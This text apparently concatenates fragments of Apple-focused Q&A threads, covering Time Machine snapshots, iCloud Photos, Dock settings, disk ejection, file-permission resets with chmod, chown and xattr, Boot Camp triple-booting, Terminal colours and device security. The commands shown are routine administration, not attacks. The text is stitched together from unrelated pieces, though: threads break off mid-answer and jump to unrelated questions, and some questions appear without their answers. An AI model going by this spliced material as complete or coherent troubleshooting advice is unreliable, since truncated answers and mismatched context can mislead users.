screens so you could place assistive touch here and it won't be hovering an app icon as there is no more app icon here.\nFinally, I don't think there is any app which could lock your screen without jailbreaking your iPhone.\n", "Q: APFS/High Sierra - tmutil deletelocalsnapshots will not delete snapshots - Error parsing argument This is kind of an addendum to APFS/High Sierra - `tmutil deletelocalsnapshots` not deleting snapshots as I've discovered a new quirk in tmutil\nMy snapshots all have am or pm appended.

Basically, on macOS, I would like iCloud to deliver new photos and otherwise leave my local photo library alone.  If this is not possible, is there a work around, such as a method for creating independent copies of photos that arrive via iCloud? \nI have found similar questions that explain that iCloud tightly couples photos across devices but nothing about how to work around the problem.  Clearly different devices have different storage capacity, so it makes sense that one would like to enforce different policies on each device. \n\nA: You cannot in Photos designate some photos as \"local\" and others as \"iCloud Photo Library\". It is all or nothing.\nHowever, you can have locally stored photos outside of the Photos application, which will be untouched by iCloud Photo Library.\nRegarding your comment about storage capacities: In Photos Preferences under the iCloud tab, you can set your storage policy to either (a) store photos and videos in full resolutions on this Mac, or (b) store photos and videos in full resolution on iCloud primarily and only cache photos/videos in full resolution locally as available storage allows.\n", "Q: How to start App Expose without using Force Touch or the keyboard? I know there was a way to trigger App Expose, by pointing the mouse cursor over an dock icon, and scrolling the mouse wheel.\nAs far as I remember, it was something I had to enable with the \"defaults\" command in Terminal.\nUnfortunately I don't remember how to enable this feature, and I can't find it on google nor on AskDifferent. Could somebody point me to the right direction?\n\nA: The following command will enable mouse scroll to open App Expose\ndefaults write com.apple.dock scroll-to-open -bool TRUE; killall Dock\n\nTo disable the gesture, use\ndefaults write com.apple.dock scroll-to-open -bool FALSE; killall Dock\n\n\nA: It's possible to trigger this as a Hot Corner or with a mouse click in High Sierra (available from the Mission Control area of System Preferences), though these only work for the active application. I assume you're asking about the click-and-hold behavior that was available in Snow Leopard. \nThe closest I can see now is to right-click on an application in the Dock and select \"Show All Windows\". While it takes two clicks, it does serve to pull up the App Exposé interface for the desired application. \n\n", "Q: Unable to eject disk images or drives in High Sierra I am running a MacBook Pro Early 2015 13\" on High Sierra 10.13.5, and keep getting the \"X disk cannot be ejected because one or more programs might be using it\" message, when apparently there is no program using that disk (not even Dropbox, Preview).\nIt happens sometimes when I try ejecting  an external thunderbolt Drive, and always when ejecting any .sparseimages \nI only managed to \"solve\" this issue and be able to eject the disks by going into Terminal and \"respringing\" Finder:\nkillall Finder\n\nHowever, I find this solution really inconvenient considering how often I use External Drives and disk images.\nI would appreciate if anyone knows any other possible cause or solution, or if my solution is better than forcing the disk to eject.\nEdit: After checking what processes were running, it seems there are  \"cloudd\",  \"diskimage\" and \"QuickLookUIService\" processes using a video file from the sparsedisk that are preventing me from ejecting the mounted sparseimage.\nThanks\n\nA: Often when a drive is plugged in Spotlight begins to index the entire drive.

Truly wonderful treats. But you know what my favorite types of pastries are? Donuts. I've even made a list of the types of [donuts I've eaten].\n\nand\n\nDonuts I've Eaten\nChocolate, Glazed, Frosted, Encrusted…\n\nHow could I link the text [donuts I've eaten] from the first note to the second note?\n\nA: Adding an additional method to Seamus'excellent answer from above… this one keeps you entirely in the Mac app:\n\n\n*\n\n*In the Mac app, go to the note that you want to reference (\"Donuts I've Eaten\") and click the Add people to this note button in the Notes toolbar.\n\n\n\n\n\n\n\n*In the dialog box that pops up, choose Copy Link and then Share. The Share button may be disabled as soon as you click Copy Link. You must then enter at least one contact (an email address or a phone number)  in the Add: field. Note that the contact must be different from the current iCloud user on your Mac, otherwise Share will be again disabled. This step also makes the piece of note permanently sharable until you remove the share. You can always come back to the note and copy link from what's behind the Add people to this note button.\n\n\n\n\n\n\n\n*The note's unique URL is now copied to your clipboard. It should look something like this \"https://www.icloud.com/notes/0-QF4Bf9jmhfersTKH16_2_kA#Donus_Ive_Eaten\"\n\n*You can paste that URL into the note that you want to have the reference in. But, even better, highlight the words that you want to become the clickable text, type Command+k to bring up the \"Link Destination\" box and paste it in there. \n\nIn this method, the note is technically shared now. But since it's not shared with anyone else, it will just serve as a quick link/reference for your other notes. It's a bit of a hassle, but it seems to work.\n\nI should also mention that the first time I tried this, I think I was forced to add an email address in the \"Add:\" box before I could click Share… but in subsequent trials, this was unnecessary. So I'm not sure if it was a first time only kind of thing, or if I just goofed.\n\nA: I edited @Sam 's awesome answer regarding his Step 2 but here it is just in case the peer review comes in too late:\nThe Share button may be disabled as soon as you click Copy Link.

On Windows, it's not really doable. It is possible on linux with mandatory access control (for example).

If there are symbolic links, then these commands may need to be modified.\n\nYou can recursively change the folders mode to 755 (drwxr-xr-x) by using the command given below.\nfind my_folder -type d -execdir chmod 755 {} \\;\n\nYou can recursively change the regular files mode to 644 (-rw-r--r--) by using the command given below.\nfind my_folder -type f -execdir chmod 644 {} \\;\n\nYou can recursively remove user flags by using the command given below.\nsudo chflags -R nouchg,nohidden,noopaque,dump,nouappnd my_folder\n\nYou can recursively change user ownership of the files and folders by using the command given below.\nsudo chown -R $USER my_folder\n\nYou can recursively change the group of the files and folders to staff by using the command given below. \nsudo chgrp -R staff my_folder\n\nYou can recursively remove any Access Control Lists (ACLs) by using the command given below.\nchmod -RN my_folder\n\nYou can recursively remove any extended attributes by using the command given below.\nxattr -rc my_folder\n\nOften searching for locked files and/or folders can be useful.

Disk Utility on Mac OS X 10.6.8 Snow Leopard, the installed OS, says the inserted DVD is 0 bytes. \nThere are guides available for how to burn Lion to a disc, so it must be possible, unless it isn't possible anymore?\n\nA: Like @Mark Wilson mentioned in the comments, \"use a dual-layer DVD.\"\nA \"standard\" DVD only holds 4GB of data. Generally a little less than 4GB usually as the DVD's file system has a little overhead so it is usually 3.9GB or thereabouts.\nBest Buy, Office Depot and Amazon all sell dual layer DVDs.

I have paused the process, exited and re-entered the directory, but I've had no luck. Is there a way to restart the download without getting an error message\n\nA: If a hard disk is disconnected while it is being written to, you need to do a few things before you can use it again. This also depends on which format was used on the hard disk.\n\n\n*\n\n*Connect the hard disk\n\n*Start the Disk Utility\n\n*Find the external hard disk on the left hand side of the disk utility and right-click (or control-click) on it\n\n*Select 'Run First Aid', then when it asks you if you want to run First Aid, click 'Run'\n\n*Allow the process to run to completion.\n\n*After it has finished, if there were no errors on the disk, everything is fine. You can then continue. If there are errors on the disk, then you probably need to delete the file you were trying to download and start the download again.\n\n\nIf there were no errors, you can continue an interrupted download in wget by using the -c flag, for example:\nwget -c https://example.com/file.ext\n\nBest of luck!

I'm running High Sierra, and installing Windows 10 on a second partition on the same disk. I have no problem installing Windows 10 via bootcamp (which defaults to legacy mode). In this case, the Windows Bootcamp Drivers (v. 5261) install perfectly and Windows boots normally (i.e., when holding ALT during bootup, I can select a partition labeled \"Windows.\" I am also able to boot directly back and forth b/w Windows and Mac using Bootcamp Control Panel in Windows 10 / \"Startup Disk\" in High Sierra).\nThe problem is that I cannot seem to properly install Windows 10 in EFI mode. In order to install using the EFI option on the Win10 Install DVD (or a USB installation), I first have to create a partition (using Bootcamp Assistant or Disk Utility) and then reset my MBR to \"Protected\" wth Gdisk. I can then perform an EFI installation of Windows 10, but when I run BootCamp's drivers (I've tried BootCamp 5.1 v. 5261, as well as 6.1 and 4.0), Windows crashes with a black screen and then turns off.\nAdditionally, when I perform an EFI installation, I cannot boot into Windows XP from High Sierra using \"Startup Disk.\" Although \"Windows\" appears in the last of startup options, if I reboot from \"Startup Disk\" I get a black screen with a flashing DOS cursor. With a legacy installation, I don't experience this issue.\nI believe that Windows 10 EFI is not properly detecting my video card (an Apple NVIDIA GeForce GT 120). In Legacy mode, the bootcamp drivers properly register it as a GT 120, but in EFI mode, Windows recognizes it as a GeForce 9500 GT. With an EFI install, the only way I can boot fully is to first disable the Display Adapter in Safe Mode. Any attempt to install a video card driver (with Bootcamp or using NVIDIA's drivers) causes windows to crash and go into a boot loop until I disable the video card. Normal workarounds (like running BootCamp.msi from an elevated command prompt, or editing the launch conditions for BootCamp.msi using orca) let me complete installing Bootcamp in EFI, but I still have to disable the Display Adapter in safe mode, and I still cannot boot into Win10 from OS X (using \"startup disk\").\nI've tried editing Bootcamp's Info.plist (to enable Windows 10, USB, and edit the 'PreUEFI' section) but this doesn't make a difference. I've also tried using WinClone to convert a (working) Legacy Mode windows installation into an EFI installation and I get the exact same errors (a bootloop until I disable the display adapter in safe mode).\nI would keep the Legacy Mode installation and forget about the EFI installation - but my goal is to create additional partitions so that I can eventually triple-boot macOS/Windows/Ubuntu (which I cannot do with a Legacy Mode installation, which limits me to 4 partitions per disk). I would also like to avoid using alternative boot managers (like reFInd) and stick with the Apple Boot Manager instead.\nIf anyone had any insights, I'd really appreciate any help in getting my EFI installation to work (or, alternatively, adding partitions to a legacy installation).\nThanks!\n\nA: Apple did not supply EFI mode Window drivers for your Mac. Therefore, there is no point pursuing an EFI install of Windows. In the later versions of macOS (including High Sierra), the Boot Camp Assistant can be used to download the Windows Support Software for 64 bit installs of Windows on your Mac. At the time of this writing, this download should be the same as downloading Boot Camp Support Software 5.1.5621.\nEditing Bootcamp's Info.plist as solution is a myth. What you end up with is a installer for a different Mac. In other words, the installer usually will not even boot on the Mac used to create it.\nTriple booting from your primary internal disk is not only possible, but has been documented at Ask Different, Super User and Ask Ubuntu. Of course, you have not specified which operating systems you wish include in your desired triple boot. For your Mac, the best course is to boot any Windows operating systems in legacy BIOS mode and all others in EFI mode.\nThe rEFInd boot manager is useful tool, but is usually not required to boot an operating system on newer Mac computers. The Apple Boot Manager usually is capable of booting any Mac compatible operating system, provided the operating system is installed in a way compatible with the Apple Boot Manager. For some operating systems, this may require you to modify some boot files' location and name after installation. On the other hand, rEFInd can often be used to avoid these types of modifications.\nWhile GPT disks can have more than 4 partitions, the legacy mode BIOS booting of Windows allows only 4 partitions to be visible to Windows. Although, making more than 4 partitions visible to Windows is theoretically possible, I do not know of anyone every trying to do so. Also, there is no requirement that the first 4 GPT partitions be the ones visible to Windows.\nI can provide the current disk configuration from a 2007 iMac as an example of a Mac computer with more than two operating systems installed. Below is the output from diskutil list.\n/dev/disk0 (internal, physical):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      GUID_partition_scheme                        *1.0 TB     disk0\n   1:                        EFI EFI                     209.7 MB   disk0s1\n   2:       Microsoft Basic Data Shark                   202.0 GB   disk0s2\n   3:       Microsoft Basic Data Shark2                  202.0 GB   disk0s3\n   4:       Microsoft Basic Data SHARK3                  50.0 GB    disk0s4\n   5:                  Apple_HFS Steelhead               245.1 GB   disk0s5\n   6:                 Apple_Boot Recovery HD             650.0 MB   disk0s6\n   7:                  Apple_HFS Ubuntu                  199.2 MB   disk0s7\n   8:                 Linux Swap                         4.3 GB     disk0s8\n   9:           Linux Filesystem                         93.9 GB    disk0s9\n  10:                  Apple_HFS Steelhead2              198.9 GB   disk0s10\n  11:                 Apple_Boot Recovery HD             650.0 MB   disk0s11\n  12:                        EFI REFIND                  134.2 MB   disk0s12\n\nThis Mac has the following bootable partitions which can be selected from the Startup Manager.\n\n\n*\n\n*Shark which has a BIOS bootable version of 64 bit Windows 10 installed.

I've followed the procedure from scratch a few times, and wanted to note the following in case it saves anyone else some work:\nCorrecting \"Missing Operating System\" when booting Windows:\nAfter following the steps in the guide above (successfully installing Ubuntu on top of a bootable Win10 Legacy Installation), I find both \"Windows\" and \"EFI Boot\" options available in Mac Startup Manager. The Ubuntu option boots, but the \"Windows\" option goes to a black screen that says \"Missing Operating System.\" This error persisted even after reseting PRAM/NVRAM and SMC. To correct this, I followed these directions: I booted from the Win10 Installation DVD, launched \"Repair,\" opened a Command Prompt, and used DiskPart to select my Win10 partition to make it active.\nAdding main Linux, Swap, and EFI partitions:\nAfter completing the first section in the guide above (creating free space with Win10 / Gdisk), you can modify the next step (adding the main Ubuntu partition) to instead add multiple partitions. I used the Ubuntu Installer to create a total of three partitions as outlined in this guide: a 200M EFI partition (which I placed at the end of the free space), then an 8G Swap partition (again, placed at the end of the free space). Finally I used the remaining free space as an EXT4 file system for Ubuntu installation. Here is the output of diskutil list:\n/dev/disk0 (internal, physical):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      GUID_partition_scheme                        *2.0 TB     disk0\n   1:                        EFI EFI                     209.7 MB   disk0s1\n   2:                  Apple_HFS Macintosh HD            1.5 TB     disk0s2\n   3:                 Apple_Boot Recovery HD             650.0 MB   disk0s3\n   4:       Microsoft Basic Data BOOTCAMP                290.3 GB   disk0s4\n   5:                        EFI UBUNTU                  200.3 MB   disk0s5\n   6:                 Linux Swap                         8.0 GB     disk0s6\n   7:           Linux Filesystem                         201.5 GB   disk0s7\n\nChanging Ubuntu Bootup Na,e\nAfter finishing Ubuntu installation and fixing the Windows boot option, I booted into Mac OS and followed these steps (steps 1-5 of \"the second way\" under \"alternative answer\") to move / rename the required .efi files from the original EFI partition (in my case, /dev/disk0s1) to the Ubuntu EFI partition (for me /dev/disk0s5). I then renamed the Ubuntu EFI partition (to \"Ubuntu\") and deleted the folder \"BOOT\" from /Volumes/EFI/EFI. Now, on bootup, the Ubuntu option says \"UBUNTU\" instead of \"EFI Boot.\" If you want, you can download a Ubuntu .icns file and place it in the appropriate location. \nOptionally, you can use Disk Utility in MacOS to format the FAT32 Ubuntu EFI partition as \"MacOS Journaled\" so that you can use lowercase letters in the name that appears on bootup. First, back up the \"EFI\" folder from the existing Fat32 Ubuntu partition and after formatting it in Disk Utility, restore the contents of the \"EFI\" folder. Once you do this, Windows will once again say, \"Missing Operating System\" and will require you to once again make the partition active using Diskpart and the installation DVD.\nHere is the result:\n\nRemaining Issues:\nEven though this results in a working triple-boot, the \"Startup Disk\" tool in MacOS only shows Windows and MacOS - not Ubuntu. I am still looking for a way to reboot into Ubuntu directly from MacOS (either through a terminal command or by adding Ubuntu to \"Startup Disk\"):\n\nOptional: Save Bluetooth Settings b/w Ubuntu and MacOS\nWhen I tried using the same bluetooth keyboard / mouse in both Ubuntu and MacOS, I had to re-pair the devices each time I rebooted. To fix this issue, I followed this guide to transfer link key parings from MacOS to Ubuntu.\nThanks again for your feedback. Looking forward to any insights on the last remaining issues!\n\nA: I get to install and setup and that's it! Once the Mac Pro restarts it never boots back to Windows 10. Automatic Repair messages. Then the message Automatic Repair couldn't repair your PC. With this same message every single time: C:\\Windows\\System32\\Logfiles\\Srt\\SrtTrail.txt.

After removing the Nvidia driver all is well!\nThe issue, I must reboot by hold down the Option key to select between the EFI (Windows) or Mac OS.

It uses ANSI colors, and displays normally with the OSX terminal defaults EXCEPT the \"normal white\" and \"normal magenta\" are strangely dimmed despite cranking the ANSI colors to the max:\n\nWhat's so strange about this is that the text at the very top is the correct value of white, but the rest is not. When I drag the color of \"normal white\" around, ALL of the white text changes proportionally, the text at the top AND the rest of the white text. Similarly, dragging \"normal magenta\" does affect the magenta text, but it never goes all the way up to what it's supposed to be. In comparison, those who access this via Windows (not sure what terminal) see the correct rendering.\nI've checked all the regular things: opacities are all 100%. I tried adjusting every color to see if they have any effect (none). I tried ALL of the terminal types to no effect.\nWhat gives? It's as though there's a second layer over the text dimming it, and yet that text at the top is mysteriously correct!\n(Incidentally, I tried iTerm2 yet couldn't get ANY ANSI colors at all!? [I tried every terminal option and relevant character encoding])\n\nA: OK, I don't know if this is a bug or what, but I found a very effective solution/workaround.\nIn Preferences > Profiles > Text > ANSI Colors:\nSet the Blue (4) color to 0% opacity and then in\nBackground > Color & Effects:\nif I set the opacity to 99% instead of 100%, the previously illegible text looks GREAT. Totally clear and legible, exactly what I wanted. But weirdly, setting 100% opacity makes it completely low-contrast and illegible. Leaving Blue (4) at default is still legible, but lower-contrast.\nSo again, not sure if the 99/100% opacity thing is a bug, but this works.\n", "Q: Mac app will no longer open I have an app installed on my iMac running High Sierra 10.13.6.

Apple's own iBooks app allows adding bookmarks, but doesn't allow continuous scrolling for PDFs, only for EPUBs. This is annoying because most pages are zoomed out past the white margin, so every time I flip a page I need to zoom in past the white margin so the text is bigger.\nAdobe reader for iPad doesn't have this problem, since you can easily choose to scroll continuously. However this reader strangely has the fatal flaw of not being able to add bookmarks. This issue has been brought up for years on the official Adobe forums, but it doesn't appear the developers care about adding this feature.\nFoxit Reader has both bases covered: it has bookmarks, and it allows continuous scrolling. However, it has annoying save and load times every time I switch to another PDF file.\nThis is an interesting situation, since for each reader's problem, the other two readers don't have the problem at all; for example, both Adobe and Foxit have continuous scrolling that works wonderfully; both iBooks and Adobe allow instant switching between files, and both ibooks and Foxit allow flawless bookmarks.\nIs there a PDF reader for iOS that has all three bases covered?\n\nA: I have been a happy GoodReader user for many years. Lately, I have switched to PDF Expert, though, since I like its interface better (especially for adding and editing annotations). It is not quite as featureful as GoodReader, though.\nBoth use tabs to let you switch quickly between documents.

Previously, it was  Users/timisenman/ and now it's Users/timisenman 1/.\nI'd really like to just delete that [space] 1. It's annoying as hell and I worry it's going to mess up file access later.\nI can't find a reliable way to do this. Any tips?\nThanks!\n(I'm using macOS Mojave)\n\nA: This page at Apple Support has details about how to change both the short and long username and the Home Folder name.\nHere's an extract, lifted verbatim from the link above, to change the Home Folder name:\n\n\n*\n\n*Log out of the account you're renaming, then log in to an administrator account.\n\n\nThe administrator account needs to be a different account than the one you're renaming. If necessary, create another administrator account, then remove it when you're done.\n\n\n*Go to the Users folder on the startup drive. The Users folder contains the home folder of the account you're renaming. Rename that account's home folder and make note of both the old name and new name. When renaming the folder, you're prompted to enter the administrator name and password that you used to log in.\n\n*Choose Apple menu > System Preferences, then click Users & Groups.\n\n*Click the lock icon, then enter the administrator name and password that you used to log in.\n\n*From the list of users, Control-click or right-click the user that you want to rename. Choose Advanced Options from the shortcut menu.\n\n*Change the “Account name” field to match the new name that you gave the home folder in the Users folder.\n\n\nWhen modifying the account name (short name) or home folder name, it should not contain any spaces. If the current account name already contains a space, you won't be able to edit this field until the space has been removed. Click immediately after the space, or use the left arrow key to move the text insertion point immediately after the space, then press the Delete key to remove the space.\n\n\n*Change the “Home directory” field to match the new name that you gave the home folder in the Users folder.\n\n*Click OK, then quit System Preferences.\n\n*Restart your Mac.\n\n*Log in to the renamed account, then verify that your old files and folders are visible and the account is working as expected.\n", "Q: Limitations on running Windows on latest Macbook Pro I'm strongly considering to buy latest Macbook Pro because of the hardware (i5 with Quad core) and design. I'm a Windows IT Pro and virtualization is a hard requirement for me, in addition to running Windows 10 most of the time. Would there be any limitations in terms of virtualization or other functionality in Windows I should be aware of or would it be just like buying any other high end computer?\n\nA: You need macOS to download the drivers needed to install Windows 10. Once you have the drivers, you can install Windows 10 with or without macOS. Windows 10 will EFI boot and operate the same as any other new PC. There should be no limitations in terms of virtualization or other functionality in Windows.\n\nA: I don't think Hyper-V is supported unless something has changed.\nhttps://discussions.apple.com/message/31049104#31049104\n", "Q: Is it possible to install macOS onto external SSD on a Mac running Ubuntu? Currently I am running only Ubuntu on my MacBook Air. Many have suggested I reinstall or install macOS on an external drive in case I ever need to troubleshoot, or in case something goes wrong. How can I install macOS on an external SSD from Ubuntu itself? Is this possible or do I need to use a friend's Mac?\nIn case Ubuntu didn't start up or break for whatever reason, would it be as simple as plugging in the SSD with the macOS and then pressing Option (Or optionally Alt) to boot from the SSD?\n\nA: It is quite simple to install macOS on an external drive using macOS Internet Recovery.\n\n\n*\n\n*Plug in the external drive.\n\n*Turn on or restart your Mac, then immediately hold down ⌘ + R keys.\n\n*Release the keys when you see the Apple logo or a spinning globe.\n\n*macOS Utilities window similar to the one below will be displayed.\n\n\n\n*Proceed to erasing the external disk by selecting Disk Utility and clicking continue.\n\n*Select your device or volume in the sidebar of Disk Utility.\n\n*Click the Erase button or tab.\n\n*Complete these fields:\n\n\n*\n\n*Name: Enter a name for your disk, such as \"Macintosh HD\".\n\n*Format: Choose Mac OS Extended (Journaled) or APFS.\n\n*Scheme (if available): Choose GUID Partition Map.\n\n\n\n*Click Erase to begin erasing your disk.\n\n*When done, quit Disk Utility to return to the utilities window. You're now ready to install macOS.\n\n*Choose Reinstall macOS (or Reinstall OS X) from the utilities window.\n\n*Click Continue, then follow the onscreen instructions. You'll be asked to select your disk. Select the external disk (identify it with the value supplied for Name in step # 8).\n\n*Click Install. Your MacBook Air will restart after the installation is complete.\n\nVoila! Your bootable external disk is now ready.\nYes, if you are unable to boot into Ubuntu for whatever reason, you can simply plug in the external SSD with the macOS installed and then press and hold Option (Alt) to boot from the external SSD?\nTo boot from the external disk:\n\n\n*\n\n*Turn on or restart your MacBook Air with the external disk connected.\n\n*Press and hold the Option key immediately.\n\n*Release the Option key when you see the Startup Manager window.\n\n*Select your startup disk, then click the arrow under its icon, or press Return.\n\n\nA: Sure you can, but explaining how depends on the model/year of your Mac. \n\n\n*\n\n*You never need a bootable macOS on the internal drive to install to an external drive from Lion on. So that removes Linux totally from the equation.\n\n\nAssuming you have a fairly new model, here are the basic instructions.\n\n\n*\n\n*Connect the external drive.\n\n*Boot to internet recovery mode. Choose to boot to an internet recovery that allows the latest version of macOS, which would be High Sierra. This means hold down the Option-Command-R keys at startup.\n\n*Use Disk Utility application to initialize the external drive. Choose the APFS format.\n\n*Install High Sierra to the external drive.\n\n", "Q: iOS - Replace Siri with Google Assistant I have been using both Siri and Google Assistant. Between the two, I find latter to be more smarter and prefer it over the former. \nIs there a way to replace Siri with Google Assistant? If yes, how do I do so?\n\nA: Siri and Google Assistant are similar offerings from Apple and Google and are deeply integrated in their respective mobile OS. It is not possible to replace one with the other.\nWhile Siri is exclusive to iOS (along with other OS by Apple macOS, watchOS and tvOS), Google provides the Google Assistance app for iOS.\nGoogle Assistant app for iOS can be downloaded on iTunes App Store.\nOn an additional note, as Siri is deeply integrated into iOS, there are various features exclusive to it, which Google Assistant cannot perform on iOS.\n", "Q: iPhone 5 (iOS 10.3.3) getting pretty hot within brief usage of 5-10 minutes I've been using an iPhone 5 for about a year and have never faced this issue. Due to some reason which I am unaware of, whenever I use it in an air-conditioned room, it gets pretty hot from both back and front.\nThis happens even when I am just using the flashlight or the built-in Camera app.\nI checked with a mobile workshop, but it was of no use. Got the battery replaced with a new one, but to no avail.\nHow do I overcome this heating issue?\n\nA: While there could be a variety of reasons for an iPhone to warm up, the common ones include using it while it's charging, using a bad (cheap, 3rd party) charger, bad battery (can be ruled out as you mentioned you got the battery replaced), one or the other component failure due to ageing (iPhone 5 was released in 2012 and were last produced in 2013 before being discontinued), using a rouge app (a non-performant app which may cause device heat up on slower devices, usually happens with some 3rd party apps and certain resource intensive games) etc.\nLuckily, you iPhone has a built-in heat sensor and if it gets warm beyond a point, it will show a warning sign and shut down automatically. So, while heat up could be a concern, there should be no real threat of serious damage (again, it is preferable to use Apple original charging equipment).\nWhile there could be no concrete answer for the issue, I'd experiment with tweaking with various parameters mentioned above.\n\nA: Even thought the battery is new, I'd get a copy of coconut Battery app for macOS and analyse iPhone's battery health. This will require connecting your iPhone to a Mac (note that the app is available only for macOS).\nThis Mac application will analyze your battery and tell you if it's charging correctly. You can download the app for free.\n", "Q: Credit card numbers stolen. How to check if my MacBook has a keylogger installed? My credit card numbers have been stolen recently. I suspect that was because of my MacBook. I'm thinking that because I had never had the issue before, until recently, after I started using a MacBook Pro (and let Safari stored my card information).\nList of Safari extensions that I installed:\n\n\n*\n\n*AdGuard Adblocker\n\n*Translate\nList of applications that I installed:\n\n\n*\n\n*MacTeX\n\n*TeXstudio\n\n*Visual Studio Code\n\n*Google Chrome (just to check for passwords that I forgot so that I can use them again in Safari)\n\n*Some fonts (Cambria Math, STIX Two, TeX Gyre)\n\n\nI installed Malwarebytes and scanned my Mac but dit not find anything.\nHow can I check if my MacBook is keylogged?\nThank you very much in advance for your help!\n\nA: The short answer is you already have! \nMalwarebytes, like most (if not all) antivirus software for Macs, also guards against other nefarious activities, including keyloggers.\nThe free trial of Malwarebytes (which I assume is what you used to scan your Mac), would have identified any threats and cleaned your Mac of any infections. The free trial also comes with 30 days access to their premium service, so you could also take advantage of that as well.\nAssuming you're a personal/home user, then many of the free options will most likely meet your needs, so don't feel obligated to keep using Malwarebytes if your preference is otherwise. \nThere are many other options out there you can choose from. As a starting point you can refer to the AV Comparatives list of antivirus vendors for Mac.\nYou may also want to read the most recent (as of now) AV Comparatives Mac Security Test and Review report (conducted in 2017).\n", "Q: Does deleting user account on macOS also deletes their installed apps? On a Mac with more than one user account, I can open apps installed by other users through Spotlight.\nIf I delete the other user accounts, will their apps get deleted too? \n\nA: On macOS, an app bundle (.app file) can technically be located anywhere. Although, in the most general case, apps are installed in the shared /Applications directory and in some cases in the directory with same name in the users Home directory ~/Applications (or more completely /Users/<username>/Applications).\nDeleting a user account deletes the users Home directory. Thus, all the app installed by user in the root /Applications directory remain unaffected.\nUsually, when deleting a user account, macOS gives an option to preserve their Home directory contents. Any app installed in the Home directory can technically be carried over and used.\nIn short, to put it simply, since users files are hidden from each other, if you were able to use an app installed by other user, you will continue to have access to it even after their account is deleted from macOS.\n", "Q: Jailbreaking iPhone 5 How do I Jailbreak my iPhone 5.

I know that the log-in can be found with Terminal (Last command), but how can I know this activity has been done in this mac or in another mac with this same storage?\nImage added as part of answer by Jaume:\n\n\nA: \nI need to know if the storage drive in a Mac (SSD/flash storage or\n  hard drive), has been used on another machine (same model probably).\n\nmacOS logs the computer's MAC addresses in these files: /var/log/daily.out and /var/log/wifi.log.\nSince a MAC address (MAC stands in this context for media access control) is unique to every network interface and thus different on every Mac, you can list the current computer's MAC addresses and check if they differ from what has been logged:\n\n\n*\n\n*Launch the Terminal app, located in /Applications/Utilities.\n\n*Run:\nifconfig | grep -A 2 '^en' | grep ether | sed 's/\\(.*\\)\\(..:..:..:..:..:..\\)/\\2/'\n\nto list all physical MAC addresses on your Mac.\nOutput will be similar to this:\n60:f8:11:8f:f0:00\ne0:f8:43:42:6d:40\nd2:00:11:8f:f0:00\n\n\n*Now run:\nsudo grep 'initWithInterfaceAndIE: _myMacAddress' /var/log/wifi.log | sed 's/\\(.*\\)\\(..:..:..:..:..:..\\)/\\2/' | sort | uniq\n\nto list all logged physical MAC adresses.\nOutput will be similar to this:\n60:f8:11:8f:f0:00\n\n\n*Compare the output of ifconfig with the logged MAC addresses. \nIf a MAC address listed in step 3 is not included in the list from step 2, it is very probable that the internal storage has been used with another Mac.\n", "Q: How can I prevent my iOS app appstore page description from being indexed by search engines?

When compile swift source files or write code in Sierra(the latest macOS), Xcode frequently freeze. It's nuking productivity. After a long time of searching, I found this is caused by a process named tccd which take up to 70% of CPU usage. What is tccd? It seems to be a access controller that manage the permission to user's contacts.

The official Apple store is too far away, and the wait time is too long.\nMy iPhone is running the latest iOS 11.4, but I want to make sure that the content on iPhone remain as secure as possible, whilst it's in the hands of a 3rd party. The potential dangers I could think of are:\n\n\n*\n\n*Service personnel accessing user data on the iPhone\n\n*Installation of undesirable software/malware on the iPhone by service personnel.\nMy first instinct was to backup the iPhone, factory reset and wipe it and then hand it over to the repair shop. Once received from service, factory reset and wipe again, and restore the data from backup.\nIs this a failsafe approach? Any other thoughts?\n\nA: \nMy first instinct was to backup the iPhone, factory reset and wipe it and then hand it over to the repair shop. Once received from service, factory reset and wipe again, and restore the data from backup.\n\nThis is an extremely safe approach. While the concerns raised in the question are well-researched and fairly obvious, this approach may involve a lot of work & time from your side. If I were in the situation, I'd do the same to remain extra cautious.\niOS is a fairly safe and robust platform and the likelihood of getting unintended data transfers (to and from) are very low when the device is locked. The likelihood can be further strengthened manyfold just by turning off the iPhone or restarting and not unlocking it (even once).\nWith recent releases of iOS 11.4.1, Apple has further strengthened the device security by introducing a feature called iOS Restricted Mode, which when enabled (it is enabled by default) restricts unauthorised access over the device Lighting Port.

I wish to use it for Web app development. It's been well-used by the previous owner for Software development and DevOps.\nIt runs like a HAL9000 (I suspect some Mac guru has configured it thus). So I do not wish to wipe and reinstall macOS. I wish to determine a list of all the apps and packages along with their version information installed via various sources like Mac App Store, manually installed software, Homebrew, MacPorts, Fink etc. For each app/package I am looking to obtain the following information:\n\n\n*\n\n*Installed version.\n\n*Installation source, i.e. via a package manager (Homebrew, MacPorts, Fink), macOS pre-installed, or unknown (direct download).\n\n*Primary configuration file location. For e.g. httdp.conf, my.cnf, php.ini bin and log dirs for A++ etc.\nI don't think of the Mac App Store as a package manager per-se, and I guess the app are tied to ones Apple ID than the machine, right?\nBy knowing the source or installation of package will help me with cleanup on unneeded apps and upgradation of the rest.\nAdditionally, it will be really helpful to identify components installed on virtual machines, XAMPP, MAMP environments etc. which have been in use.\nI know theres containerisation, as Docker is installed.\nWhen I say packages, I'm primarily interested in:\n\n\n*\n\n*Major system services and Development libraries.\n\n*RDBMS, such as MySQL, MariaDB, PostgreSQL etc.\n\n*Web servers, such as Apache, Tomcat, Nginx, JBoss etc.\n\n*Core language libraries, such as Python, PHP, Java etc. If filtering is a hassle, all is good too from library to GUI app.\n\n*Programming language frameworks installed, such as PHP: Laravel, CodeIgniter; Python: MySQL Connectors etc.\n\n*Testing frameworks, such as PHPUnit.\n\n*Additional component packages and plugins installed/active beyond default configuration.\n\n*Front-end tooling, such as CSS: Bootstrap, JavaScript: Libraries. I'm guessing these would be installed in specific development environments not the whole machine? I don't think it would be possible to identify this level of environment for reuse and they tend to be set-up according to developer preferences and and the primary IDE/tools they use.\n\n*Developer tools, such FTP/SFTP Apps, Espresso, CSEdit, LiveStyle.\n\n*Web Browsers and associated tools, such as extensions and bookmarklets that would complete a full audit of macOS development environment.\nSpeaking of Editors & IDE's, I've got a ton of them, including Eclipse, Codekit, PhpStorm, Brackets, Sublime Text 3, Coda, TextWrangler, BBEdit, TextMate, Atom etc.\nAs a other way round ToDo, it would be great to have a general system audit tool and I could filter out.\nAnyway, the primary question is how of identify the source package installer; so I can reverse out or upgrade cleanly.

